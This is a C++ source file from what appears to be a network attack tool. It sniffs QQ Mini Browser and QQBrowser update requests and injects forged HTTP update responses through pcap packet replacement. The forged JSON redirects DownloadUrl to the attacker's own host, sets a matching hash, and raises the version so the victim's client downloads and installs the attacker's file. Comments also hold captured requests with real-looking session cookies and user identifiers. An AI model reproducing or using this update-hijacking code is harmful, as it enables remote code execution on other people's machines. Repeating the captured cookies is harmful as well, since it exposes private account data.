

#include "QQMiniBrowser.h"
#include <windows.h>
#include <iostream>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "..\\SdkVersion.h"
#include "../version.h"
#include "../HttpUtils.h"


using namespace std;

char * qqhdr = "POST /qbrowser ";
int qqhdrlen = lstrlenA(qqhdr);

char *qqagent = "User-Agent: QQBrowser";
int qqagentlen = lstrlenA(qqagent);

char * qqupdatehdr = "POST /getMiniBrowserUpdateConfig";
int qqupdatehdrlen = lstrlenA(qqupdatehdr);


string QQMiniBrowser::getTypeName() {
	return "PCQQ";
}


//CSoftID
//POST /qbrowser
int QQMiniBrowser::isQQPacket(char * lpdata, int datalen) {
	if ((memcmp(lpdata, "{\r\n", 3) == 0) && (memcmp(lpdata + datalen - 3, "}\r\n", 3) == 0)) {

		if (strstr(lpdata, "COS") && strstr(lpdata, "CVer") && strstr(lpdata, "QID") && strstr(lpdata, "QQVer")) {
			return TRUE;
		}
	}
// 	else {
// 		if (memcmp(lpdata, qqupdatehdr, qqupdatehdrlen) == 0 && strstr(lpdata, "Host: appstore.browser.qq.com"))
// 		{
// 			return TRUE;
// 		}
// 		else if (memcmp(lpdata,qqhdr, qqhdrlen) == 0 && strstr(lpdata,"Host: update.browser.qq.com"))
// 		{
// 			if (strstr(lpdata,qqagent) )
// 			{
// 				return 1;
// 			}
// 			else {
// 				return 2;
// 			}
// 			return TRUE;
// 		}
// 	}

	return 0;
}

int QQMiniBrowser::SetSdkVersion(char * flag, char * end,char * lphttpdata) {
	
	char srcvalue[256] = { 0 };
	int srcvaluelen = Public::getstring(flag, end, lphttpdata, srcvalue,0);
	if (srcvaluelen == FALSE)
	{
		return FALSE;
	}
	char sztmpver[MAX_PATH];
	lstrcpyA(sztmpver, srcvalue);

	char * szversions[8] = { 0 };
	int vercnt = SdkVersion::GetSdkVersion(sztmpver, szversions);
	int versions[8] = { 0 };
	for (int i = 0; i < vercnt; i++)
	{
		versions[i] = strtoul(szversions[i], 0, 10);
	}

	
	char newflag[] = "\"NewVer\": \"";
	int newflaglen = lstrlenA(newflag);
	char * lphdr = strstr(m_lpResp, newflag);
	char * lpend = lphdr;
	int len = 0;
	if (lphdr) {
		lphdr += newflaglen;
		lpend = strstr(lphdr, end);
		len = lpend - lphdr;
		if (len != srcvaluelen)
		{
			string prepversion = string(lphdr, len);
			printf("sdk version size not same,the prepared sdkversion:%s,the sniffered sdkversion:%s\r\n", prepversion.c_str(), srcvalue);
			return FALSE;
		}

		versions[2] ++;
		versions[3] ++;

		char sznewver[256];
		int newverlen = wsprintfA(sznewver, "%01u.%01u.%04u.%03u", versions[0], versions[1], versions[2], versions[3]);
		printf("request version:%s,response version:%s\r\n", srcvalue, sznewver);
		memmove(lphdr, sznewver, newverlen);

		return TRUE;
	}
	return FALSE;
}


int QQMiniBrowser::sendRespDataQQBrowser(pcap_t * pcapT, const char * lppacket, int packetsize, char * ip, int type, LPPPPOEHEADER pppoe) {

	int ret = 0;
	if (m_iRespSizeQQBrowser && m_lpRespQQBrowser)
	{
		ret = AttackPacket::ReplacePacket(pcapT, lppacket, packetsize, m_lpRespQQBrowser, m_iRespSizeQQBrowser, ip, type, pppoe);
	}
	return ret;
}

//qq broser pc
/*
POST /qbrowser HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
User-Agent: QQBrowser
Content-Length: 216
Host: update.browser.qq.com

{"COS":"10.0.17134","COSLan":2052,"CSoftID":9,"CVer":"10.3.2864.400","Cmd":1,"GUID":"d6c641822d3d710ba54a5a94067c37b5",
"InstallTimeStamp":1545725235,"SupplyID":"101","TriggerMode":2,"UIN":"0","bPatch":1,"osDigit":64}
*/
int QQMiniBrowser::prepareQQBrowserRespData(unsigned long ulIP, string filepath, string filename) {
	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Length: %u\r\n"	//Content-Type: text/html; charset=utf8\r\n
		"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"{\r\n\"CSoftID\": 9,"
		"\"CommandLine\": \"\","
		"\"Desp\": \"\","
		//\\u0041\\u0049\\u004f\\u65b0\\u95fb\\u7a97\\u7684\\u65b0\\u5efa\\u6807\\u7b7e\\u9875\\u0055\\u0052\\u004c\\u4fee\\u6539
		"\"DownloadUrl\": \"http://%s/%s\","
		"\"ErrCode\": 0,"
		"\"File\": \"%s\","
		"\"Flags\": 1,"
		"\"Hash\": \"%s\","
		"\"InstallType\": 0,"
		"\"NewVer\": \"%s\","
		"\"PatchFile\": \"QBDeltaUpdate.exe\","
		"\"PatchHash\": \"%s\","
		"\"Sign\": \"\","
		"\"Size\": %u,"
		"\"VerType\": \"\"}\r\n";			//38572099

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		szip.c_str(), filename.c_str(), filename.c_str(), m_szmd5, QQBROWSER_QQMINIBROWSER_VERSION, m_szmd5, m_filesize);

	m_iRespSizeQQBrowser = sprintf_s(m_lpRespQQBrowser, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return m_iRespSizeQQBrowser;
}



//qq call dll register function
int QQMiniBrowser::prepareRespData(unsigned long ulIP, string filepath, string filename) {
	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Length: %u\r\n"	//Content-Type: text/html; charset=utf8\r\n
		"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"{\r\n\"CSoftID\": 22,"
		"\"CommandLine\": \"\","
		"\"Desp\": \"\","
		//\\u0041\\u0049\\u004f\\u65b0\\u95fb\\u7a97\\u7684\\u65b0\\u5efa\\u6807\\u7b7e\\u9875\\u0055\\u0052\\u004c\\u4fee\\u6539
		"\"DownloadUrl\": \"http://%s/%s\","
		"\"ErrCode\": 0,"
		"\"File\": \"%s\","
		"\"Flags\": 1,"
		"\"Hash\": \"%s\","
		"\"InstallType\": 0,"
		"\"NewVer\": \"%s\","
		"\"PatchFile\": \"QBDeltaUpdate.exe\","
		"\"PatchHash\": \"%s\","
		"\"Sign\": \"\","
		"\"Size\": %u,"
		"\"VerType\": \"\"}\r\n";			//38572099

	
	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat, 
		szip.c_str(),filename.c_str(),filename.c_str(), m_szmd5, QQMINIBROWSER_VERSION, m_szmd5,m_filesize);

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return m_iRespSize;
}






/*
POST /qbrowser HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0) QQBrowser/9.0
Host: update.browser.qq.com
Content-Length: 345
Connection: Keep-Alive
Cache-Control: no-cache
Cookie: pt2gguin=o2210853762; tvfe_boss_uuid=74dadbc6a63c2b7a; pgv_pvid=1468610875; o_cookie=2210853762; ptcz=15e9a55229ccf7e3ca164fd779252a8ed6ce542651b120d1a5bdb43188e0c855; pgv_pvi=4750401536; RK=jM7ImpSFyt; uin_cookie=2210853762; euin_cookie=85CBA3E1C1A28B98D934056BCB5BACE12D3001DDB0B9B813

{
"COS": "10.0.17134",
"CSoftID": 22,
"CVer": "1.1.9999.001",
"Cmd": 1,
"ExeVer": "1.0.1118.400",
"GUID": "9308ec3d7b7602d10f39e90f88399236",
"InstallTimeStamp": 1542122874,
"QID": 16805931,
"QQVer": "9.0.3.23756",
"SupplyID": 0,
"TriggerMode": 1,
"UIN": 0,
"bPatch": 0,
"osDigit": 64
}
HTTP/1.1 200
Date: Sat, 15 Dec 2018 15:48:47 GMT
Content-Length: 406
Connection: keep-alive

{ "CSoftID": 22, "CommandLine": "", "Desp": "\u8f6c\u5b8c\u6574\u7248", "DownloadUrl": "http://dl_dir.qq.com/invc/tt/minibrowser7.zip", 
"ErrCode": 0, "File": "minibrowser7.zip", "Flags": 1, "Hash": "f6accbe9ea5574f20110abf4899a97a4", "InstallType": 0, 
"NewVer": "1.0.1141.400", "PatchFile": "QBDeltaUpdate.exe", "PatchHash": "f6accbe9ea5574f20110abf4899a97a4", 
"Sign": "", "Size": 29650492, "VerType": "" }
*/



/*
POST /getMiniBrowserUpdateConfig HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0) QQBrowser/9.0
Host: appstore.browser.qq.com
Content-Length: 181
Connection: Keep-Alive
Cache-Control: no-cache
Cookie: pt2gguin=o2210853762; tvfe_boss_uuid=74dadbc6a63c2b7a; pgv_pvid=1468610875; o_cookie=2210853762; ptcz=15e9a55229ccf7e3ca164fd779252a8ed6ce542651b120d1a5bdb43188e0c855; pgv_pvi=4750401536; RK=jM7ImpSFyt; uin_cookie=2210853762; euin_cookie=BE48A2E053C2FB6BB9EECCF3CEAB2579DFC4C1F9C20609A0

{
   "COS": "10.0.17134",
   "CVer": "1.1.9999.001",
   "ExeVer": "",
   "GUID": "9308ec3d7b7602d10f39e90f88399236",
   "QID": 16809060,
   "QQVer": "",
   "osDigit": 64
}
HTTP/1.1 302 Moved Temporarily
Server: nginx
Date: Sat, 15 Dec 2018 16:07:13 GMT
Content-Type: text/html
Content-Length: 154
Connection: keep-alive
Location: https://appstore.browser.qq.com/getMiniBrowserUpdateConfig

<html>
<head><title>302 Found</title></head>
<body bgcolor="white">
<center><h1>302 Found</h1></center>
<hr><center>nginx</center>
</body>
</html>

*/